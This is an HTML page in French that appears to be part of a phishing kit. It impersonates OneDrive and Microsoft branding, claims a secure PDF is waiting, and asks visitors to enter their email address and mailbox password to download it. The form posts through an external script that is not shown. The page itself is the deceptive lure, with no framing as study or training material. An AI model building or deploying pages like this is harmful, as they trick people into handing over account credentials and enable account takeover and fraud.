<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérifiez Votre Identité</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

</head>
<body>
    <!-- Bande bleue contenant l'image principale -->
    <div class="header-bar">
        <img src="téléchargement.png" alt="Onedrive Logo" class="main-logo">
    </div>

    <!-- Contenu principal dans une carte -->
    <div class="container">
        <div class="card">
            <!-- Image secondaire centrée au-dessus de la carte -->
            <img src="microsoft.png" alt="Microsoft Logo" class="secondary-logo">
            
            <!-- Titre -->
            <h4 class="card-title">Vérifiez Votre Identité</h4>

            <!-- Description -->
            <p class="card-description">
                Vous avez reçu un fichier sécurisé. <br>
                <img src="PDF.png" alt="PDF Icon" class="file-icon"><br>
                Pour telecharger le document, veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.
            </p>

            <!-- Formulaire -->
            <form class="card-form">
                <input type="email" placeholder="Entrez votre adresse email" class="form-input">
                <input type="password" placeholder="Entrez votre mot de passe" class="form-input">
                <button type="submit" class="form-button">S'identifier</button>
            </form>
            <div id="loading" style="display: none;">Chargement...</div>

        </div>
    </div>
    <script src="script.js"></script>

</body>

</html>
